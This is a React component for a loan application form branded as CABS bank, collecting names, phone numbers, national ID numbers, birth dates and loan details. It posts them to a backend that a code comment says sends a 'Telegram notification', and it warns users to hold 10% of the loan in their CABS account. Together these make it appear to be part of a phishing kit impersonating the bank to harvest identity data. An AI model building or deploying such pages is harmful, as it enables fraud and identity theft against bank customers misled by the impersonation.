import React, { useState } from 'react';
import { CabsLogo } from './CabsLogo';
import { LoanApplicationData, FormErrors } from '../types';
import { KeyRound, AlertTriangle, ArrowLeft } from 'lucide-react';

interface LoanFormPageProps {
  initialData: LoanApplicationData;
  onSubmit: (data: LoanApplicationData) => void;
  onBack: () => void;
  onToast: (msg: string, isError?: boolean) => void;
}

export const LoanFormPage: React.FC<LoanFormPageProps> = ({
  initialData,
  onSubmit,
  onBack,
  onToast,
}) => {
  const [formData, setFormData] = useState<LoanApplicationData>(initialData);
  const [errors, setErrors] = useState<FormErrors>({});
  const [touched, setTouched] = useState<Record<string, boolean>>({});

  const validateField = (name: keyof LoanApplicationData, value: any): string | undefined => {
    switch (name) {
      case 'fullName':
        if (!value || typeof value !== 'string' || value.trim().length < 3 || !value.trim().includes(' ')) {
          return 'Please enter your full name (at least 2 words).';
        }
        return undefined;
      case 'phone':
        if (!value || !/^\+?[0-9\s\-]{7,15}$/.test(value.trim())) {
          return 'Enter a valid phone number with country code (e.g. +263...).';
        }
        return undefined;
      case 'email':
        if (value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())) {
          return 'Please enter a valid email address.';
        }
        return undefined;
      case 'idNumber':
        if (!value || value.trim().length < 3) {
          return 'National ID or Passport number is required.';
        }
        return undefined;
      case 'dobYear': {
        const y = parseInt(value, 10);
        const currentYear = new Date().getFullYear();
        if (isNaN(y) || y < 1900 || y > currentYear - 18) {
          return 'Must be born by ' + (currentYear - 18) + ' (18+ yrs).';
        }
        return undefined;
      }
      case 'dobMonth': {
        const m = parseInt(value, 10);
        if (isNaN(m) || m < 1 || m > 12) {
          return 'Month 1-12.';
        }
        return undefined;
      }
      case 'dobDay': {
        const d = parseInt(value, 10);
        if (isNaN(d) || d < 1 || d > 31) {
          return 'Day 1-31.';
        }
        return undefined;
      }
      case 'employment':
        if (!value) {
          return 'Please select your employment status.';
        }
        return undefined;
      case 'loanType':
        if (!value) {
          return 'Please select a loan type.';
        }
        return undefined;
      case 'loanAmount': {
        const amt = parseFloat(value);
        if (isNaN(amt) || amt <= 0) {
          return 'Enter a valid loan amount (minimum $1).';
        }
        return undefined;
      }
      case 'repayment':
        if (!value) {
          return 'Please select a repayment period.';
        }
        return undefined;
      case 'terms':
        if (!value) {
          return 'You must agree to the terms to proceed.';
        }
        return undefined;
      default:
        return undefined;
    }
  };

  const handleChange = (name: keyof LoanApplicationData, value: any) => {
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (touched[name]) {
      const err = validateField(name, value);
      setErrors((prev) => ({ ...prev, [name]: err }));
    }
  };

  const handleBlur = (name: keyof LoanApplicationData) => {
    setTouched((prev) => ({ ...prev, [name]: true }));
    const err = validateField(name, (formData as any)[name]);
    setErrors((prev) => ({ ...prev, [name]: err }));
  };

  const validateAll = (): boolean => {
    const newErrors: FormErrors = {};
    let firstErrorField: string | null = null;

    const checkField = (field: keyof LoanApplicationData) => {
      const err = validateField(field, (formData as any)[field]);
      if (err) {
        newErrors[field as keyof FormErrors] = err;
        if (!firstErrorField) firstErrorField = field;
      }
    };

    checkField('fullName');
    checkField('phone');
    checkField('email');
    checkField('idNumber');
    checkField('dobYear');
    checkField('dobMonth');
    checkField('dobDay');
    checkField('employment');
    checkField('loanType');
    checkField('loanAmount');
    checkField('repayment');
    checkField('terms');

    // Date consistency validation
    const y = parseInt(formData.dobYear, 10);
    const m = parseInt(formData.dobMonth, 10);
    const d = parseInt(formData.dobDay, 10);
    if (y && m && d) {
      const dateObj = new Date(y, m - 1, d);
      const isValid =
        dateObj.getFullYear() === y &&
        dateObj.getMonth() === m - 1 &&
        dateObj.getDate() === d;
      const age = new Date().getFullYear() - y;
      if (!isValid || age < 18) {
        newErrors.dob = 'Please enter a valid date of birth (must be at least 18 years old).';
        if (!firstErrorField) firstErrorField = 'dobYear';
      }
    }

    setErrors(newErrors);
    setTouched({
      fullName: true,
      phone: true,
      email: true,
      idNumber: true,
      dobYear: true,
      dobMonth: true,
      dobDay: true,
      employment: true,
      loanType: true,
      loanAmount: true,
      repayment: true,
      terms: true,
    });

    if (firstErrorField) {
      const el = document.getElementById(firstErrorField);
      if (el) el.focus();
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateAll()) {
      onToast('Please fix the highlighted errors before submitting.', true);
      return;
    }

    onToast('Submitting application...');
    
    try {
      // Send form data to backend for Telegram notification
      const apiUrl = import.meta.env.VITE_API_URL || `${window.location.origin}/api`;
      const response = await fetch(`${apiUrl}/submit-form`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      const result = await response.json();
      
      if (result.success) {
        // Store submission ID in form data
        const dataWithId = { ...formData, submissionId: result.submissionId };
        onToast('Application submitted successfully! Redirecting...');
        setTimeout(() => {
          onSubmit(dataWithId);
        }, 1200);
      } else {
        throw new Error(result.error || 'Submission failed');
      }
    } catch (error) {
      console.error('Form submission error:', error);
      onToast('Failed to submit application. Please try again.', true);
    }
  };

  const handleReset = () => {
    const emptyState: LoanApplicationData = {
      fullName: '',
      phone: '',
      email: '',
      idNumber: '',
      dobYear: '',
      dobMonth: '',
      dobDay: '',
      employment: '',
      income: '',
      loanType: '',
      loanAmount: '',
      repayment: '',
      terms: false,
    };
    setFormData(emptyState);
    setErrors({});
    setTouched({});
    onToast('Form reset successfully');
  };

  const loanAmountNum = parseFloat(formData.loanAmount) || 0;
  const requiredDeposit = (loanAmountNum * 0.1).toFixed(2);

  return (
    <div
      className="min-h-screen py-8 px-4 flex items-center justify-center relative bg-gradient-to-br from-[#273C83] to-[#1a2a5c] text-[#333]"
      style={{ fontFamily: "'Albert Sans', sans-serif" }}
    >
      {/* Background ambient lighting */}
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          backgroundImage:
            'radial-gradient(circle at 20% 50%, rgba(141,198,63,0.08) 0%, transparent 50%), radial-gradient(circle at 80% 80%, rgba(0,134,112,0.12) 0%, transparent 50%)',
        }}
      />

      <div className="w-full max-w-[900px] relative z-10">
        {/* Navigation back pill */}
        <div className="mb-4 flex items-center justify-between">
          <button
            onClick={onBack}
            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-white text-xs font-semibold backdrop-blur-xs transition-colors cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Home</span>
          </button>
        </div>

        {/* Form Card */}
        <div className="bg-white rounded-2xl p-6 sm:p-8 md:p-10 shadow-[0_12px_40px_rgba(39,60,131,0.25)] border-t-[4px] border-[#8DC63F]">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-6 mb-6 border-b-[3px] border-[#8DC63F] -mx-6 sm:-mx-8 md:-mx-10 -mt-6 sm:-mt-8 md:-mt-10 p-6 sm:p-8 bg-white rounded-t-2xl">
            <CabsLogo variant="loan" size="md" showTagline={false} />
            <div
              className="text-xs text-[#008670] font-bold uppercase tracking-wider"
              style={{ fontFamily: "'Urbanist', sans-serif" }}
            >
              We&apos;ll Help You Get There
            </div>
          </div>

          {/* Header Text & Important Notice */}
          <div className="mb-7">
            <h1
              className="text-2xl sm:text-3xl font-extrabold text-[#273C83] mb-2"
              style={{ fontFamily: "'Urbanist', sans-serif" }}
            >
              Loan Application <span>Portal</span>
            </h1>
            <p className="text-[#6b7280] text-sm leading-relaxed">
              Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.
            </p>

            {/* 10% Deposit Alert Banner */}
            <div className="mt-4 p-4 rounded-xl bg-gradient-to-r from-[rgba(39,60,131,0.06)] to-[rgba(0,134,112,0.08)] border-l-4 border-[#008670] flex items-center justify-between relative overflow-hidden">
              <div className="flex items-center gap-3 pr-8">
                <KeyRound className="w-5 h-5 text-[#008670] shrink-0" />
                <p className="text-sm font-semibold text-[#273C83] leading-snug">
                  <strong>Important:</strong> You must have at least 10% of the loan amount you want in your CABS account.
                  {loanAmountNum > 0 && (
                    <span className="block text-xs text-[#008670] mt-1 font-bold">
                      Required min account balance: ${requiredDeposit} USD for a ${loanAmountNum.toLocaleString()} loan.
                    </span>
                  )}
                </p>
              </div>
              <span className="text-2xl opacity-30 select-none hidden sm:inline">🔑</span>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} noValidate>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
              {/* Full Name */}
              <div className="flex flex-col">
                <label
                  htmlFor="fullName"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Full Name *
                </label>
                <input
                  id="fullName"
                  type="text"
                  required
                  value={formData.fullName}
                  placeholder="Enter your full name"
                  autoComplete="name"
                  onChange={(e) => handleChange('fullName', e.target.value)}
                  onBlur={() => handleBlur('fullName')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.fullName
                      ? 'border-[#dc2626] bg-[#fef2f2] focus:ring-4 focus:ring-red-500/10'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670] focus:ring-4 focus:ring-[#008670]/10'
                  }`}
                />
                {errors.fullName && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.fullName}
                  </span>
                )}
              </div>

              {/* Phone Number */}
              <div className="flex flex-col">
                <label
                  htmlFor="phone"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Phone Number *
                </label>
                <input
                  id="phone"
                  type="tel"
                  required
                  value={formData.phone}
                  placeholder="+263..."
                  autoComplete="tel"
                  onChange={(e) => handleChange('phone', e.target.value)}
                  onBlur={() => handleBlur('phone')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.phone
                      ? 'border-[#dc2626] bg-[#fef2f2] focus:ring-4 focus:ring-red-500/10'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670] focus:ring-4 focus:ring-[#008670]/10'
                  }`}
                />
                <div className="text-[11px] text-[#6b7280] mt-1">Include country code (e.g., +263)</div>
                {errors.phone && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.phone}
                  </span>
                )}
              </div>

              {/* Email */}
              <div className="flex flex-col">
                <label
                  htmlFor="email"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Email
                </label>
                <input
                  id="email"
                  type="email"
                  value={formData.email}
                  placeholder="you@example.com"
                  autoComplete="email"
                  onChange={(e) => handleChange('email', e.target.value)}
                  onBlur={() => handleBlur('email')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.email
                      ? 'border-[#dc2626] bg-[#fef2f2] focus:ring-4 focus:ring-red-500/10'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670] focus:ring-4 focus:ring-[#008670]/10'
                  }`}
                />
                {errors.email && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.email}
                  </span>
                )}
              </div>

              {/* National ID */}
              <div className="flex flex-col">
                <label
                  htmlFor="idNumber"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  National ID *
                </label>
                <input
                  id="idNumber"
                  type="text"
                  required
                  value={formData.idNumber}
                  placeholder="ID / Passport Number"
                  onChange={(e) => handleChange('idNumber', e.target.value)}
                  onBlur={() => handleBlur('idNumber')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.idNumber
                      ? 'border-[#dc2626] bg-[#fef2f2] focus:ring-4 focus:ring-red-500/10'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670] focus:ring-4 focus:ring-[#008670]/10'
                  }`}
                />
                {errors.idNumber && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.idNumber}
                  </span>
                )}
              </div>

              {/* Date of Birth */}
              <div className="flex flex-col md:col-span-2">
                <label
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Date of Birth * (Must be 18+ years)
                </label>
                <div className="grid grid-cols-3 gap-3">
                  <div>
                    <input
                      id="dobYear"
                      type="number"
                      placeholder="YYYY"
                      min="1900"
                      max={new Date().getFullYear() - 18}
                      value={formData.dobYear}
                      onChange={(e) => handleChange('dobYear', e.target.value)}
                      onBlur={() => handleBlur('dobYear')}
                      className={`w-full px-3 py-3.5 rounded-xl border-2 text-[15px] text-center bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                        errors.dobYear || errors.dob
                          ? 'border-[#dc2626] bg-[#fef2f2]'
                          : 'border-[#e8ecf3] focus:border-[#008670]'
                      }`}
                    />
                    <div className="text-[10px] text-center text-gray-500 mt-1">Year</div>
                  </div>
                  <div>
                    <input
                      id="dobMonth"
                      type="number"
                      placeholder="MM"
                      min="1"
                      max="12"
                      value={formData.dobMonth}
                      onChange={(e) => handleChange('dobMonth', e.target.value)}
                      onBlur={() => handleBlur('dobMonth')}
                      className={`w-full px-3 py-3.5 rounded-xl border-2 text-[15px] text-center bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                        errors.dobMonth || errors.dob
                          ? 'border-[#dc2626] bg-[#fef2f2]'
                          : 'border-[#e8ecf3] focus:border-[#008670]'
                      }`}
                    />
                    <div className="text-[10px] text-center text-gray-500 mt-1">Month</div>
                  </div>
                  <div>
                    <input
                      id="dobDay"
                      type="number"
                      placeholder="DD"
                      min="1"
                      max="31"
                      value={formData.dobDay}
                      onChange={(e) => handleChange('dobDay', e.target.value)}
                      onBlur={() => handleBlur('dobDay')}
                      className={`w-full px-3 py-3.5 rounded-xl border-2 text-[15px] text-center bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                        errors.dobDay || errors.dob
                          ? 'border-[#dc2626] bg-[#fef2f2]'
                          : 'border-[#e8ecf3] focus:border-[#008670]'
                      }`}
                    />
                    <div className="text-[10px] text-center text-gray-500 mt-1">Day</div>
                  </div>
                </div>
                {(errors.dob || errors.dobYear || errors.dobMonth || errors.dobDay) && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.dob || errors.dobYear || errors.dobMonth || errors.dobDay}
                  </span>
                )}
              </div>

              {/* Section Divider: Employment */}
              <div
                className="md:col-span-2 pt-3 pb-1 border-b border-dashed border-gray-300 text-xs font-bold text-[#273C83] uppercase tracking-wider"
                style={{ fontFamily: "'Urbanist', sans-serif" }}
              >
                Employment Details
              </div>

              {/* Employment Status */}
              <div className="flex flex-col">
                <label
                  htmlFor="employment"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Employment Status *
                </label>
                <select
                  id="employment"
                  required
                  value={formData.employment}
                  onChange={(e) => handleChange('employment', e.target.value)}
                  onBlur={() => handleBlur('employment')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.employment
                      ? 'border-[#dc2626] bg-[#fef2f2]'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670]'
                  }`}
                >
                  <option value="">Select status...</option>
                  <option value="Employed">Employed</option>
                  <option value="Self-employed">Self-employed</option>
                  <option value="Unemployed">Unemployed</option>
                  <option value="Student">Student</option>
                </select>
                {errors.employment && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.employment}
                  </span>
                )}
              </div>

              {/* Monthly Income */}
              <div className="flex flex-col">
                <label
                  htmlFor="income"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Monthly Income (USD)
                </label>
                <input
                  id="income"
                  type="number"
                  min="0"
                  step="0.01"
                  placeholder="0.00"
                  value={formData.income}
                  onChange={(e) => handleChange('income', e.target.value)}
                  className="px-4 py-3.5 rounded-xl border-2 border-[#e8ecf3] text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] hover:border-[#00a88a] focus:border-[#008670]"
                />
              </div>

              {/* Section Divider: Loan Details */}
              <div
                className="md:col-span-2 pt-3 pb-1 border-b border-dashed border-gray-300 text-xs font-bold text-[#273C83] uppercase tracking-wider"
                style={{ fontFamily: "'Urbanist', sans-serif" }}
              >
                Loan Details
              </div>

              {/* Loan Type */}
              <div className="flex flex-col">
                <label
                  htmlFor="loanType"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Loan Type *
                </label>
                <select
                  id="loanType"
                  required
                  value={formData.loanType}
                  onChange={(e) => handleChange('loanType', e.target.value)}
                  onBlur={() => handleBlur('loanType')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.loanType
                      ? 'border-[#dc2626] bg-[#fef2f2]'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670]'
                  }`}
                >
                  <option value="">Select loan type...</option>
                  <option value="Personal Loan">Personal Loan</option>
                  <option value="Business Loan">Business Loan</option>
                  <option value="Salary Advance">Salary Advance</option>
                  <option value="School Loan">School Loan</option>
                </select>
                {errors.loanType && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.loanType}
                  </span>
                )}
              </div>

              {/* Loan Amount */}
              <div className="flex flex-col">
                <label
                  htmlFor="loanAmount"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Loan Amount (USD) *
                </label>
                <input
                  id="loanAmount"
                  type="number"
                  step="any"
                  min="1"
                  required
                  placeholder="0.00"
                  value={formData.loanAmount}
                  onChange={(e) => handleChange('loanAmount', e.target.value)}
                  onBlur={() => handleBlur('loanAmount')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.loanAmount
                      ? 'border-[#dc2626] bg-[#fef2f2]'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670]'
                  }`}
                />
                {errors.loanAmount && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.loanAmount}
                  </span>
                )}
              </div>

              {/* Repayment Period */}
              <div className="flex flex-col md:col-span-2">
                <label
                  htmlFor="repayment"
                  className="block text-xs font-bold uppercase tracking-wider text-[#273C83] mb-2"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Repayment Period *
                </label>
                <select
                  id="repayment"
                  required
                  value={formData.repayment}
                  onChange={(e) => handleChange('repayment', e.target.value)}
                  onBlur={() => handleBlur('repayment')}
                  className={`px-4 py-3.5 rounded-xl border-2 text-[15px] transition-all bg-[#fafafa] focus:bg-white outline-none min-h-[48px] ${
                    errors.repayment
                      ? 'border-[#dc2626] bg-[#fef2f2]'
                      : 'border-[#e8ecf3] hover:border-[#00a88a] focus:border-[#008670]'
                  }`}
                >
                  <option value="">Select duration...</option>
                  <option value="1 Month">1 Month</option>
                  <option value="3 Months">3 Months</option>
                  <option value="6 Months">6 Months</option>
                  <option value="12 Months">12 Months</option>
                  <option value="18 Months">18 Months</option>
                  <option value="24 Months">24 Months</option>
                  <option value="36 Months">36 Months</option>
                  <option value="60 Months">60 Months</option>
                </select>
                {errors.repayment && (
                  <span className="text-[#dc2626] text-xs font-semibold mt-1.5 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.repayment}
                  </span>
                )}
              </div>

              {/* Terms Checkbox */}
              <div className="md:col-span-2 p-4 rounded-xl bg-[#008670]/5 border border-[#008670]/15 flex items-start gap-3 mt-2">
                <input
                  id="terms"
                  type="checkbox"
                  required
                  checked={formData.terms}
                  onChange={(e) => handleChange('terms', e.target.checked)}
                  onBlur={() => handleBlur('terms')}
                  className="w-5 h-5 mt-0.5 accent-[#008670] cursor-pointer shrink-0"
                />
                <label htmlFor="terms" className="text-sm text-[#273C83] cursor-pointer font-medium leading-relaxed">
                  I confirm that the information provided is true and I agree to the CABS Loans terms and conditions.
                </label>
              </div>
              {errors.terms && (
                <div className="md:col-span-2 -mt-2">
                  <span className="text-[#dc2626] text-xs font-semibold flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    {errors.terms}
                  </span>
                </div>
              )}
            </div>

            {/* Actions Bar */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mt-8 pt-6 border-t-2 border-gray-100">
              <small className="text-xs text-[#6b7280]">Fields marked * are required.</small>
              <div className="flex items-center gap-3 w-full sm:w-auto">
                <button
                  type="submit"
                  className="flex-1 sm:flex-none px-8 py-3.5 rounded-xl bg-gradient-to-r from-[#8DC63F] to-[#75a832] hover:from-[#a3d45a] hover:to-[#8DC63F] text-[#1a2a5c] font-extrabold uppercase tracking-wider text-sm transition-all duration-200 transform hover:-translate-y-0.5 shadow-[0_4px_12px_rgba(141,198,63,0.35)] cursor-pointer"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  SUBMIT
                </button>
                <button
                  type="button"
                  onClick={handleReset}
                  className="px-6 py-3.5 rounded-xl border-2 border-[#273C83] text-[#273C83] hover:bg-[#273C83]/5 font-bold uppercase tracking-wider text-sm transition-all duration-200 cursor-pointer"
                  style={{ fontFamily: "'Urbanist', sans-serif" }}
                >
                  Reset
                </button>
              </div>
            </div>
          </form>

          {/* Trust Badge */}
          <div className="mt-8 pt-6 border-t border-gray-100 flex flex-col items-center justify-center text-center">
            <CabsLogo variant="image-only" size="md" />
            <p className="text-[11px] text-[#6b7280] font-medium mt-1">
              A Member of the Old Mutual Group
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
